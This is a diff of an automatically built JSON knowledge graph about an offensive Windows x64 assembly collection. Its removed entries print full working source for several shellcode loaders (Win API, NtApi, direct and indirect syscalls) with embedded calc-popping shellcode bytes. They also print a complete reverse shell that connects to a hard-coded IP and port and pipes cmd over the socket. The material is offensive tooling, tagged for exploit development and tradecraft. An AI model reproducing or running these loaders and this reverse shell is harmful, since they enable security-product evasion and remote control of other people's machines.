-      "id": "ingest-edge:4996892f6f88651a7e160f",
-      "source": "source:4951842f8a341cc4156168",
-      "target": "concept:7861357dc405c65c4001e1",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A method of establishing a reverse connection to a remote host."
-    },
-    {
-      "id": "ingest-edge:4dfdbe4ae19531d3b15763",
-      "source": "source:4951842f8a341cc4156168",
-      "target": "technique:f3af89f8d41b9499995f78",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "The code establishes a reverse connection to a remote host."
-    },
-    {
-      "id": "ingest-edge:bc4b8caae27ddb4135308a",
-      "source": "source:578f0653567fea44abd73d",
-      "target": "concept:2e36a0544dd37262a43501",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A Windows API function for memory allocation."
-    },
-    {
-      "id": "ingest-edge:60569c0346fbf79d22a01d",
-      "source": "source:578f0653567fea44abd73d",
-      "target": "concept:44d6d188153458c5805fc2",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A Windows API function for memory copying."
-    },
-    {
-      "id": "ingest-edge:bd84c54f1ed2a685432e00",
-      "source": "source:578f0653567fea44abd73d",
-      "target": "concept:c31158beb7d51159d0a637",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A Windows API function for changing memory protection."
-    },
-    {
-      "id": "ingest-edge:9f31fb31cce087a633b4f6",
-      "source": "source:578f0653567fea44abd73d",
-      "target": "technique:b4050f6a5254e804df5bc9",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Allocating memory with specific permissions and executing code within it."
-    },
-    {
-      "id": "ingest-edge:d6803fd2e9d0f4855139be",
-      "source": "source:da84ab5dc563d46e3edfb7",
-      "target": "concept:496018fecb3d63107c5965",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A method to execute code stored in memory."
-    },
-    {
-      "id": "ingest-edge:b6ec2e2a9360051ba6941e",
-      "source": "source:da84ab5dc563d46e3edfb7",
-      "target": "technique:496018fecb3d63107c5965",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Executing code stored in memory through an external function."
-    },
-    {
-      "id": "ingest-edge:c50c1cd69297a19513478a",
-      "source": "source:2b4e9844e8b33987159cfe",
-      "target": "concept:272449e09f1edfba17e604",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A Windows API function for memory allocation."
-    },
-    {
-      "id": "ingest-edge:c2a2dfc31dc9cb4e2dce67",
-      "source": "source:2b4e9844e8b33987159cfe",
-      "target": "concept:d926eda4be4c1eaf263e4f",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A Windows API function for memory protection."
-    },
-    {
-      "id": "ingest-edge:080d7566c0b9eb5f4cded7",
-      "source": "source:2b4e9844e8b33987159cfe",
-      "target": "concept:d9a163920d91e7e098502d",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A Windows API function for writing to virtual memory."
-    },
-    {
-      "id": "ingest-edge:a43f5b0c52963be6bab852",
-      "source": "source:2b4e9844e8b33987159cfe",
-      "target": "technique:f6bb6a6d43b07f4783380c",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Allocating and managing memory using native Windows API functions."
-    },
-    {
-      "id": "ingest-edge:7772089d2b7fd37728a1fe",
-      "source": "source:fc45cf0d02ec691729957a",
-      "target": "concept:272449e09f1edfba17e604",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A system call for memory allocation."
-    },
-    {
-      "id": "ingest-edge:b3aecfa00b8dcd85c3648e",
-      "source": "source:fc45cf0d02ec691729957a",
-      "target": "concept:d9a163920d91e7e098502d",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A system call for writing to memory."
-    },
-    {
-      "id": "ingest-edge:fa382b129e268850476ee1",
-      "source": "source:fc45cf0d02ec691729957a",
-      "target": "concept:d926eda4be4c1eaf263e4f",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A system call for changing memory protection."
-    },
-    {
-      "id": "ingest-edge:14c6357a64db9d4c30a006",
-      "source": "source:fc45cf0d02ec691729957a",
-      "target": "technique:1b570c45d3906a8b3c55ba",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Using system calls for memory allocation and execution."
-    },
-    {
-      "id": "ingest-edge:537b1c8709ed67126d7d71",
-      "source": "source:85c72a8be5174c476cb803",
-      "target": "concept:23b325dc2837ba82363c30",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A method for encrypting and decrypting data using XOR operation."
-    },
-    {
-      "id": "ingest-edge:06b495827a0cb3ecf7145f",
-      "source": "source:85c72a8be5174c476cb803",
-      "target": "technique:23b325dc2837ba82363c30",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Encrypting and decrypting data using XOR operation."
-    },
-    {
-      "id": "ingest-edge:5503ac63498ce403bc3bf6",
-      "source": "source:39cbdb4b4a246e712ac6fe",
-      "target": "concept:23b325dc2837ba82363c30",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A method for encrypting and decrypting data using XOR operation."
-    },
-    {
-      "id": "ingest-edge:8a1033019d9543ca5816e3",
-      "source": "source:39cbdb4b4a246e712ac6fe",
-      "target": "technique:23b325dc2837ba82363c30",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Encrypting and decrypting data using XOR operation."
-    },
-    {
-      "id": "ingest-edge:9e1b613607eafb92083214",
-      "source": "source:86add4df83091a2fab4222",
-      "target": "concept:b8057e07146fcfa598448c",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "A set of programs designed for Source C tasks on Windows x64, focusing on assembly language and integration with C."
-    },
-    {
-      "id": "ingest-edge:9289650a5e6a1486360613",
-      "source": "source:86add4df83091a2fab4222",
-      "target": "concept:66e410ddc02aa1db7160f6",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "The use of assembly functions called from C code, with MASM as a build dependency, to implement offensive techniques."
-    },
-    {
-      "id": "ingest-edge:498d101651fb9abd350187",
-      "source": "source:86add4df83091a2fab4222",
-      "target": "technique:0ef452b667ebe0ff2732be",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Loading shellcode using various Windows APIs, including Win API, NtApi, Syscalls, and Indirect Syscalls."
-    },
-    {
-      "id": "ingest-edge:2ec34fbec714f618c237a1",
-      "source": "source:86add4df83091a2fab4222",
-      "target": "technique:c08748fd1f833da2f24ba1",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Implementing a reverse shell by leveraging WinSock for network communication and CreateProcessA for process creation."
-    },
-    {
-      "id": "ingest-edge:4695820b3e509520317f61",
-      "source": "source:86add4df83091a2fab4222",
-      "target": "technique:db6982f933bff779e1a13e",
-      "type": "related_to",
-      "origin": "universal-ingest",
-      "rationale": "Encrypting data using a basic XOR encryption program."
     }
   ],
   "contents": {
@@ -142316,40 +141687,18 @@
     "tradecraft_qa:94de18f5f15540950e00": "## 🎯 Research Context & Scenario\n\nmain.cpp\n\n---\n\n## 🔬 Full Technical Analysis\n\n#include <iostream>\n\nusing namespace std;\nextern \"C\" void XorIt(unsigned char* data, const char* key, size_t dataSize, size_t keySize);\n\nint main() {\n\tunsigned char data[] = \"Hello\";\n\tconst char* key = \"test\";\n\n\tXorIt(data, key, sizeof(data) - 1, strlen(key));\n\tcout<<\"Encrypted: \" << data << endl;\n\tXorIt(data, key, sizeof(data) - 1, strlen(key));\n\tcout << \"Decrypted: \" << data << endl;\n\n}\n\n---\n\n***Task domain:** `research`*",
     "tradecraft_qa:590f86bfb6151e95faa5": "## 🎯 Research Context & Scenario\n\nxorit.asm\n\n---\n\n## 🔬 Full Technical Analysis\n\n.data\n\n.code\n\nXorIt proc\n\tmov r10, rcx\n\tmov r11, rdx\n\tpush r12\n\tlea r12, [rdx+r9]\n\t\nloopxor:\n cmp r8, 0\n je done\n \n mov al, [r10]\n xor al, [r11]\n mov [r10], al\n \n inc r10\n inc r11\n dec r8\n \n cmp r11, r12\n jne loopxor\n \n mov r11, rdx\n \n jmp loopxor\ndone:\n pop r12\n\tret\nXorIt endp\nend\n\n---\n\n***Task domain:** `research`*",
     "tradecraft_qa:058ca546b4f2d3733cd2": "## 🎯 Research Context & Scenario\n\nREADME.md\n\n---\n\n## 🔬 Full Technical Analysis\n\n# Offensive Windows x64 Assembly\n\nCollection of programs I made while learning assembly. They are Visual studio projects that use masm as build dependency and the assembly functions are called in C and then are given the necessary arguments.\n\n* Win API shellcode loader\n* NtApi Shellcode loader\n* Syscalls Shellcode loader (with some code in C to resolve functions)\n* Indirect Syscalls Shellcode loader\n* Basic Xor encryption program\n* Reverse Shell using WinSock and CreateProcessA\n\n# Credits\n[Creel Dynamic Memory Assembly Tutorial](https://www.youtube.com/watch?v=vJPwAjJN2Yg&list=LL)\n\n[Cr-0w Source B Loaders in C]([private-source])\n\n---\n\n***Task domain:** `exploit_dev`*",
-    "source:bb4faa95ea190a9b879b27": "## indirect.asm\n\nThe assembly code defines procedures for indirect system calls to allocate, write, and protect virtual memory, utilizing external references to system call numbers and addresses.\n\n---\n\nextern g_NtAllocateVirtualMemorySSN:DWORD\nextern g_NtAllocateVirtualMemorySyscall:QWORD\nextern g_NtWriteVirtualMemorySSN:DWORD\nextern g_NtWriteVirtualMemorySyscall:QWORD\nextern g_NtProtectVirtualMemorySSN:DWORD\nextern g_NtProtectVirtualMemorySyscall:QWORD\n\n.data\nmyMemory dq ?\noldProtect dq 0\ndwSize dq 1024\nBytesWritten dq ?\n\n.code\n\nNtAllocateVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtAllocateVirtualMemorySSN\n jmp qword ptr g_NtAllocateVirtualMemorySyscall \n ret \nNtAllocateVirtualMemory endp\n\nNtWriteVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtWriteVirtualMemorySSN \n jmp qword ptr g_NtWriteVirtualMemorySyscall \n ret \nNtWriteVirtualMemory endp\n\nNtProtectVirtualMemory proc\n mov r10, rcx\n mov eax, g_NtProtectVirtualMemorySSN \n jmp qword ptr g_NtProtectVirtualMemorySyscall \n ret \nNtProtectVirtualMemory endp\n\n\n\nNtIndirectSyscalls proc\n; 1. Save non-volatile registers used in this function (Windows x64 requirement)\n push rbx\n push r12\n push rsi; keeping 16-byte alignment (3 pushes = 24 bytes, plus 8 for return address = 32 bytes)\n\n; Setup standard 32-byte shadow space for our calls\n sub rsp, 20h \n\n mov rbx, rdx\n mov r12, rcx \n\n mov rcx, r12\n lea rdx, [myMemory]\n xor r8, r8\n lea r9, [dwSize] \n mov qword ptr [rsp + 20h], 3000h \n mov qword ptr [rsp + 28h], 04h \n call NtAllocateVirtualMemory\n \n \n mov rcx, r12\n mov rdx, myMemory \n mov r8, rbx \n mov r9, dwSize\n lea r11, [BytesWritten]\n mov qword ptr [rsp + 20h], r11 \n call NtWriteVirtualMemory\n \n mov rcx, r12\n lea rdx, [myMemory]\n lea r8, [dwSize] \n mov r9, 20h \n lea r11, [oldProtect] \n mov qword ptr [rsp + 20h], r11 \n call NtProtectVirtualMemory\n\n; Clean up shadow space stack allocation\n add rsp, 20h\n\n; Restore non-volatile registers\n pop rsi\n pop r12\n pop rbx\n\n; Ensure 16-byte alignment before jumping to shellcode payload\n and rsp, -16 \n \n; Execute the allocated & unlocked Memory Block\n call qword ptr [myMemory] \n\n ret\nNtIndirectSyscalls endp\n\nend\n\n## Concepts\n\n- **Indirect System Calls:** A method of invoking system calls indirectly through predefined system call numbers and addresses.\n\n## Techniques\n\n- **Indirect System Call Execution:** The code uses indirect system calls to perform memory operations such as allocation, writing, and protection.\n\n## Explicit entities\n\n- g_NtAllocateVirtualMemorySSN (file)\n- g_NtWriteVirtualMemorySSN (file)\n- g_NtProtectVirtualMemorySSN (file)\n\n---\n\n*Automatic ingestion status: complete*",
-    "concept:ed32971712c531a7969f4b": "## Indirect System Calls\n\nA method of invoking system calls indirectly through predefined system call numbers and addresses.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **main.cpp**.",
-    "technique:b89a5a432e8926483eb88c": "## Indirect System Call Execution\n\nThe code uses indirect system calls to perform memory operations and execute a payload.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **main.cpp**.",
-    "source:bef414c9b57c6df7512c22": "## main.cpp\n\nThe C++ code demonstrates the use of indirect system calls for memory management and execution of a payload.\n\n---\n\n#pragma once\n#include <windows.h>\n\n#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)\n\ntypedef unsigned __int64 QWORD;\n\nEXTERN_C NTSTATUS NtAllocateVirtualMemory(\n HANDLE ProcessHandle,\n PVOID* BaseAddress,\n ULONG_PTR ZeroBits,\n PSIZE_T RegionSize,\n ULONG AllocationType,\n ULONG Protect\n);\n\nEXTERN_C NTSTATUS NtProtectVirtualMemory(\n IN HANDLE ProcessHandle,\n IN OUT PVOID* BaseAddress,\n IN OUT PSIZE_T RegionSize,\n IN ULONG NewProtect,\n OUT PULONG OldProtect);\n\nEXTERN_C NTSTATUS NtWriteVirtualMemory(\n IN HANDLE ProcessHandle,\n IN PVOID BaseAddress,\n IN PVOID Buffer,\n IN SIZE_T NumberOfBytesToWrite,\n OUT PSIZE_T NumberOfBytesWritten OPTIONAL\n);\nHMODULE NtdllHandle = NULL;\n\n// from [private-source]\n\nVOID IndirectPrelude(\n _In_ HMODULE NtdllHandle,\n _In_ LPCSTR NtFunctionName,\n _Out_ PDWORD NtFunctionSSN,\n _Out_ PUINT_PTR NtFunctionSyscall\n) {\n\n DWORD SyscallNumber = 0;\n UINT_PTR NtFunctionAddress = 0;\n UCHAR SyscallOpcodes[2] = { 0x0F, 0x05 };\n\n NtFunctionAddress = (UINT_PTR)GetProcAddress(NtdllHandle, NtFunctionName);\n \n\n // Read the 4th and 5th bytes, as the system call numbers occupy 2 bytes\n BYTE byte4 = ((PBYTE)NtFunctionAddress)[4];\n BYTE byte5 = ((PBYTE)NtFunctionAddress)[5];\n *NtFunctionSSN = (byte5 << 8) | byte4; // Combine to a single DWORD\n\n *NtFunctionSyscall = NtFunctionAddress + 0x12;\n\n memcmp(SyscallOpcodes, (PVOID)*NtFunctionSyscall, sizeof(SyscallOpcodes));\n return;\n \n}\n\nextern \"C\" {\n DWORD g_NtAllocateVirtualMemorySSN = 0;\n QWORD g_NtAllocateVirtualMemorySyscall = 0;\n DWORD g_NtWriteVirtualMemorySSN = 0;\n QWORD g_NtWriteVirtualMemorySyscall = 0;\n DWORD g_NtProtectVirtualMemorySSN = 0;\n QWORD g_NtProtectVirtualMemorySyscall = 0;\n}\nextern \"C\" void NtIndirectSyscalls(HANDLE handle, unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n \"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n \"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n \"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n \"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n \"\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n \"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n\n NtdllHandle = GetModuleHandleW(L\"NTDLL\");\n\n IndirectPrelude(NtdllHandle, \"NtAllocateVirtualMemory\", &g_NtAllocateVirtualMemorySSN, &g_NtAllocateVirtualMemorySyscall);\n IndirectPrelude(NtdllHandle, \"NtWriteVirtualMemory\", &g_NtWriteVirtualMemorySSN, &g_NtWriteVirtualMemorySyscall);\n IndirectPrelude(NtdllHandle, \"NtProtectVirtualMemory\", &g_NtProtectVirtualMemorySSN, &g_NtProtectVirtualMemorySyscall);\n\n NtIndirectSyscalls(NtCurrentProcess(), payload);\n return 0;\n}\n\n## Concepts\n\n- **Indirect System Calls:** A method of invoking system calls indirectly through predefined system call numbers and addresses.\n\n## Techniques\n\n- **Indirect System Call Execution:** The code uses indirect system calls to perform memory operations and execute a payload.\n\n## Explicit entities\n\n- NtAllocateVirtualMemory (api)\n- NtProtectVirtualMemory (api)\n- NtWriteVirtualMemory (api)\n\n---\n\n*Automatic ingestion status: complete*",
-    "source:3def7075e3e7d6af5673bf": "## main.cpp\n\nThe provided code snippet demonstrates a technique for dynamically resolving and invoking system calls using a custom loader.\n\n---\n\n#include <Windows.h>\n\n#pragma comment(lib, \"ntdll\")\n\n#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)\n\nEXTERN_C NTSTATUS NtAllocateVirtualMemory(\n HANDLE ProcessHandle,\n PVOID* BaseAddress,\n ULONG_PTR ZeroBits,\n PSIZE_T RegionSize,\n ULONG AllocationType,\n ULONG Protect\n);\n\nEXTERN_C NTSTATUS NtProtectVirtualMemory(\n IN HANDLE ProcessHandle,\n IN OUT PVOID* BaseAddress,\n IN OUT PSIZE_T RegionSize,\n IN ULONG NewProtect,\n OUT PULONG OldProtect);\n\nEXTERN_C NTSTATUS NtWriteVirtualMemory(\n IN HANDLE ProcessHandle,\n IN PVOID BaseAddress,\n IN PVOID Buffer,\n IN SIZE_T NumberOfBytesToWrite,\n OUT PSIZE_T NumberOfBytesWritten OPTIONAL\n );\n\nextern \"C\" void NtApi(HANDLE handle, unsigned char* payload);\n\n\n// popcalc https://www.exploit-db.com/shellcodes/49819\nunsigned char payload[] = \"\\x48\\x31\\xff\\x48\\xf7\\xe7\\x65\\x48\\x8b\\x58\\x60\\x48\\x8b\\x5b\\x18\\x48\\x8b\\x5b\\x20\\x48\\x8b\\x1b\\x48\\x8b\\x1b\\x48\\x8b\\x5b\\x20\\x49\\x89\\xd8\\x8b\"\n\"\\x5b\\x3c\\x4c\\x01\\xc3\\x48\\x31\\xc9\\x66\\x81\\xc1\\xff\\x88\\x48\\xc1\\xe9\\x08\\x8b\\x14\\x0b\\x4c\\x01\\xc2\\x4d\\x31\\xd2\\x44\\x8b\\x52\\x1c\\x4d\\x01\\xc2\"\n\"\\x4d\\x31\\xdb\\x44\\x8b\\x5a\\x20\\x4d\\x01\\xc3\\x4d\\x31\\xe4\\x44\\x8b\\x62\\x24\\x4d\\x01\\xc4\\xeb\\x32\\x5b\\x59\\x48\\x31\\xc0\\x48\\x89\\xe2\\x51\\x48\\x8b\"\n\"\\x0c\\x24\\x48\\x31\\xff\\x41\\x8b\\x3c\\x83\\x4c\\x01\\xc7\\x48\\x89\\xd6\\xf3\\xa6\\x74\\x05\\x48\\xff\\xc0\\xeb\\xe6\\x59\\x66\\x41\\x8b\\x04\\x44\\x41\\x8b\\x04\"\n\"\\x82\\x4c\\x01\\xc0\\x53\\xc3\\x48\\x31\\xc9\\x80\\xc1\\x07\\x48\\xb8\\x0f\\xa8\\x96\\x91\\xba\\x87\\x9a\\x9c\\x48\\xf7\\xd0\\x48\\xc1\\xe8\\x08\\x50\\x51\\xe8\\xb0\"\n\"\\xff\\xff\\xff\\x49\\x89\\xc6\\x48\\x31\\xc9\\x48\\xf7\\xe1\\x50\\x48\\xb8\\x9c\\x9e\\x93\\x9c\\xd1\\x9a\\x87\\x9a\\x48\\xf7\\xd0\\x50\\x48\\x89\\xe1\\x48\\xff\\xc2\"\n\"\\x48\\x83\\xec\\x20\\x41\\xff\\xd6\";\n\nint main() {\n NtApi(NtCurrentProcess(), payload);\n return 0;\n}\n\n---\n\n*Automatic ingestion status: complete*",
-    "source:f6915c769e71eee7b97604": "## ntapi.asm\n\nThe script demonstrates a method to bypass security mechanisms by obfuscating system call usage.\n\n---\n\nextern NtAllocateVirtualMemory: proc\nextern NtWriteVirtualMemory: proc\nextern NtProtectVirtualMemory: proc\n\n.data\nmyMemory dq ?\noldProtect dq 0\ndwSize dq 1024\nBytesWritten dq ?\n.code\nNtApi proc\n; Setup Stack (Shadow space 32 bytes + 16 bytes padding = 48/30h)\n sub rsp, 30h \n mov rbx, rdx\n\n;__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(\n; [in] HANDLE ProcessHandle,\n; [in, out] PVOID *BaseAddress,\n; [in] ULONG_PTR ZeroBits,\n; [in, out] PSIZE_T RegionSize,\n; [in] ULONG AllocationType,\n; [in] ULONG Protect)\n mov r12, rcx\n lea rdx, [myMemory]\n xor r8, r8\n lea r9, [dwSize] \n mov qword ptr [rsp+20h], 3000h \n mov qword ptr [rsp+28h], 4h \n call NtAllocateVirtualMemory\n \n;NtWriteVirtualMemory(\n;IN HANDLE ProcessHandle,\n;IN PVOID BaseAddress,\n;IN PVOID Buffer,\n;IN SIZE_T NumberOfBytesToWrite,\n;OUT PSIZE_T NumberOfBytesWritten OPTIONAL);\n\n sub rsp, 30h\n mov rcx, r12\n mov rdx, myMemory \n mov r8, rbx \n mov r9, dwSize\n lea r11, [BytesWritten]\n mov qword ptr [rsp-20], r11\n call NtWriteVirtualMemory\n \n add rsp, 30h\n\n; NtProtectVirtualMemory(\n; IN HANDLE ProcessHandle,\n; IN OUT PVOID* BaseAddress,\n; IN OUT PSIZE_T RegionSize,\n; IN ULONG NewProtect,\n; OUT PULONG OldProtect);\n\n mov rcx, r12\n lea rdx, [myMemory]\n lea r8, [dwSize] \n mov r9, 20h \n lea r11, [oldProtect] \n mov qword ptr [rsp+20h], r11\n call NtProtectVirtualMemory\n\n; We ensure RSP is 16-byte aligned before jumping to the payload\n and rsp, -16 \n \n; Execute the Memory Block\n call myMemory \n\n add rsp, 30h\n ret\nNtApi endp\nend\n\n---\n\n*Automatic ingestion status: complete*",
-    "source:4951842f8a341cc4156168": "## main.cpp\n\nThe C++ code demonstrates the use of a function to establish a reverse connection to a specified IP and port.\n\n---\n\n#pragma comment(lib, \"Ws2_32.lib\")\n#include <winsock2.h>\n#include <windows.h>\n\nextern \"C\" SOCKET RevConnect(const char* IP, unsigned short port);\n\nint main() {\n\tRevConnect(\"192.168.186.130\", 445);\n\n\treturn 0;\n\n\n}\n\n## Concepts\n\n- **Reverse Connection:** A method of establishing a reverse connection to a remote host.\n\n## Techniques\n\n- **Reverse Connection Establishment:** The code establishes a reverse connection to a remote host.\n\n## Explicit entities\n\n- RevConnect (function)\n\n---\n\n*Automatic ingestion status: complete*",
-    "concept:7861357dc405c65c4001e1": "## Reverse Connection\n\nA method of establishing a reverse connection to a remote host.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **main.cpp**.",
-    "technique:f3af89f8d41b9499995f78": "## Reverse Connection Establishment\n\nThe code establishes a reverse connection to a remote host.\n\n---\n\nDerived automatically from evidence-grounded enrichment of **main.cpp**.",
-    "source:c168bd90f593bdb86a0d5a": "## rev.asm\n\nThe script demonstrates a method to execute shellcode in a remote process using a custom loader.\n\n---\n\nEXTERN WSAStartup:PROC\nEXTERN WSACleanup:PROC\nEXTERN WSASocketA:PROC\nEXTERN connect:PROC\nEXTERN closesocket:PROC\nEXTERN htons:PROC\nEXTERN inet_addr:PROC\nEXTERN CreateProcessA:PROC\nEXTERN SetHandleInformation:PROC\n\nAF_INET EQU 2\nSOCK_STREAM EQU 1\nIPPROTO_TCP EQU 6\n\nINVALID_SOCKET EQU -1\nSOCKET_ERROR EQU -1\n\nSTARTF_USESTDHANDLES EQU 00000100h\nCREATE_NO_WINDOW EQU 08000000h\nHANDLE_FLAG_INHERIT EQU 00000001h\nINFINITE EQU 0FFFFFFFFh\n\nWSADATA64 STRUCT\n wVersion WORD ?\n wHighVersion WORD ?\n szDescription BYTE 257 DUP(?)\n szSystemStatus BYTE 129 DUP(?)\n iMaxSockets WORD ?\n iMaxUdpDg WORD ?\n lpVendorInfo QWORD ?\nWSADATA64 ENDS\n\nSOCKADDR_IN STRUCT\n sin_family WORD ?\n sin_port WORD ?\n sin_addr DWORD ?\n sin_zero BYTE 8 DUP(?)\nSOCKADDR_IN ENDS\n\nSTARTUPINFOA STRUCT\n cb DWORD ?\n _pad0 DWORD ?\n lpReserved QWORD ?\n lpDesktop QWORD ?\n lpTitle QWORD ?\n\n dwX DWORD ?\n dwY DWORD ?\n dwXSize DWORD ?\n dwYSize DWORD ?\n dwXCountChars DWORD ?\n dwYCountChars DWORD ?\n dwFillAttribute DWORD ?\n dwFlags DWORD ?\n\n wShowWindow WORD ?\n cbReserved2 WORD ?\n _pad1 DWORD ?\n\n lpReserved2 QWORD ?\n hStdInput QWORD ?\n hStdOutput QWORD ?\n hStdError QWORD ?\nSTARTUPINFOA ENDS\n\nPROCESS_INFORMATION64 STRUCT\n hProcess QWORD ?\n hThread QWORD ?\n dwProcessId DWORD ?\n dwThreadId DWORD ?\n dwPadding_ DWORD ?\nPROCESS_INFORMATION64 ENDS\n\n.data?\nwsaData WSADATA64 <>\nsockaddr_buf SOCKADDR_IN <>\nsinfo STARTUPINFOA <>\npinfo PROCESS_INFORMATION64 <>\nappPath db 16 DUP(?)\n\n.code\n\nRevConnect PROC\n\n push rdi\n push rsi\n push rbx\n sub rsp, 0A0h; Allocate a secure stack frame (16-byte aligned)\n\n mov rdi, rcx \n mov ebx, edx \n\n; WSAStartup(0x0202, &wsaData)\n lea rdx, wsaData\n mov ecx, 0202h\n call WSAStartup\n test eax, eax\n jnz fail\n\n; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)\n mov ecx, AF_INET\n mov edx, SOCK_STREAM\n mov r8d, IPPROTO_TCP\n xor r9, r9; lpProtocolInfo = NULL\n mov qword ptr [rsp + 20h], 0; g = 0 (5th arg)\n mov qword ptr [rsp + 28h], 0; dwFlags = 0 (6th arg)\n call WSASocketA\n cmp rax, INVALID_SOCKET\n je fail_cleanup\n\n mov rsi, rax; rsi = socket handle\n\n; Explicitly mark socket handle as inheritable\n mov rcx, rsi \n mov edx, HANDLE_FLAG_INHERIT \n mov r8d, HANDLE_FLAG_INHERIT \n call SetHandleInformation\n\n; sockaddr_in setup\n mov word ptr [sockaddr_buf.sin_family], AF_INET\n mov ecx, ebx\n call htons\n mov word ptr [sockaddr_buf.sin_port], ax\n\n mov rcx, rdi\n call inet_addr\n mov dword ptr [sockaddr_buf.sin_addr], eax\n\n; connect(socket, &sa, sizeof(sa))\n mov rcx, rsi\n lea rdx, sockaddr_buf\n mov r8d, SIZEOF SOCKADDR_IN\n call connect\n \n cmp eax, SOCKET_ERROR\n je fail_socket\n\n mov dword ptr [sinfo.cb], SIZEOF STARTUPINFOA\n mov dword ptr [sinfo.dwFlags], STARTF_USESTDHANDLES\n \n; Map the socket handle cleanly to all standard handles\n mov qword ptr [sinfo.hStdInput], rsi\n mov qword ptr [sinfo.hStdOutput], rsi\n mov qword ptr [sinfo.hStdError], rsi\n\n lea rax, appPath\n mov byte ptr [rax+0], 'c'\n mov byte ptr [rax+1], 'm'\n mov byte ptr [rax+2], 'd'\n mov byte ptr [rax+3], 0\n\n;CreateProcessA(NULL, \"cmd\", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)\n xor r12, r12\n mov qword ptr [rsp + 20h], 1; bInheritHandles = TRUE (5th param)\n mov qword ptr [rsp + 28h], CREATE_NO_WINDOW; dwCreationFlags (6th param)\n mov qword ptr [rsp + 30h], r12; lpEnvironment (7th param)\n mov qword ptr [rsp + 38h], r12; lpCurrentDirectory (8th param)\n \n lea r12, sinfo\n mov qword ptr [rsp + 40h], r12; lpStartupInfo (9th param)\n \n lea r12, pinfo\n mov qword ptr [rsp + 48h], r12; lpProcessInformation (10th param)\n\n xor rcx, rcx; lpApplicationName = NULL\n lea rdx, appPath; lpCommandLine = \"cmd\"\n xor r8, r8; lpProcessAttributes = NULL\n xor r9, r9; lpThreadAttributes = NULL\n\n call CreateProcessA\n \nfail_socket:\n mov rcx, rsi\n call closesocket\n\nfail_cleanup:\n call WSACleanup\n\nfail:\n xor rax, rax\n\nexit_func:\n add rsp, 0A0h\n pop rbx\n pop rsi\n pop rdi\n ret\n\nRevConnect ENDP\n\nEND\n\n---\n\n*Automatic ingestion status: complete*",
